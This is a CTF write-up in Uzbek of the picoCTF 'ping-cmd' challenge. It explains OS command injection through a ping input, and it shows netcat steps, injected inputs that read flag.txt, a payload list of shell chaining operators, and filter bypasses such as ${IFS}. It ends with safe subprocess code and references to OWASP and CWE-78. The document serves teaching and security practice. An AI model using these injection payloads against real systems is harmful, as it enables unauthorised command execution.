# 🌐 Web Exploitation — Advanced Challenges

> **Kategoriya:** Web Exploitation  
> **Challenges:** ping-cmd  
> **Daraja:** Medium  
> **Muallif:** [4n0nyrn0u5](https://github.com/4n0nyrn0u5)

---

## 1. ping-cmd

### 📋 Challenge tavsifi
Web forma yoki Netcat orqali IP manzil kiritiladi va server uni `ping` buyrug'iga uzatadi. Input sanitize qilinmagan — bu klassik **OS Command Injection** zaifligidir.

### 🔧 Command Injection nima?
```bash
# Server ichida shunday ishlaydi:
os.system(f"ping -c 4 {user_input}")

# Agar user_input = "8.8.8.8; cat flag.txt" bo'lsa:
os.system("ping -c 4 8.8.8.8; cat flag.txt")
# → ping ishlaydi VA flag o'qiladi!
```

### 🔍 Yechim jarayoni

**1-qadam — Netcat bilan ulanish:**
```bash
nc mysterious-sea.picoctf.net [PORT]
# Enter an IP address to ping! (We only allow '8.8.8.8'):
```

**2-qadam — Oddiy test:**
```
8.8.8.8
# Normal ping ishlaydi → input serverga uzatilmoqda
```

**3-qadam — Command injection:**
```bash
8.8.8.8; ls
# Ping ishlaydi + ls natijasi:
# flag.txt  script.sh
```

**4-qadam — Flagni o'qiymiz:**
```bash
8.8.8.8; cat flag.txt
# Ping natijasi...
# picoCTF{p1nG_c0mm@nd_3xpL0it_...}
```
✅ Flag topildi!

### 🛠️ Ishlatilgan toollar
| Tool | Maqsad |
|------|--------|
| `netcat` | Serverga ulanish |
| `;` operatori | Buyruq zanjiri |

### Command Injection Payloadlar
```bash
# Buyruq zanjiri operatorlari:
8.8.8.8; id           # Ketma-ket
8.8.8.8 | id          # Pipe
8.8.8.8 && id         # Birinchisi muvaffaqiyatli bo'lsa
8.8.8.8 || id         # Birinchisi xato bo'lsa
8.8.8.8 `id`          # Backtick
8.8.8.8 $(id)         # Subshell

# Filter bypass:
8.8.8.8;cat${IFS}flag.txt   # Space filtri
8.8.8.8;ca\t flag.txt        # Backslash
```

### 💡 Xulosa
> OS Command Injection — OWASP Top 10 A03:2021. Foydalanuvchi kiritgan ma'lumot shell buyrug'iga qo'shilsa, hujumchi ixtiyoriy buyruq bajarishi mumkin. Himoya: `subprocess.run(['ping', '-c', '4', ip])` — argument sifatida uzatish, string concatenation emas.

**Xavfli kod:**
```python
# ❌ XAVFLI:
os.system(f"ping {user_input}")
```
**Xavfsiz kod:**
```python
# ✅ XAVFSIZ:
subprocess.run(['ping', '-c', '4', user_input], 
               capture_output=True)
```

**OWASP:** A03:2021 – Injection  
**CWE:** CWE-78 – OS Command Injection

**Kalit tushunchalar:** Command injection, shell metacharacters, `netcat`, subprocess

---

*PicoCTF | Web Exploitation | Command Injection*
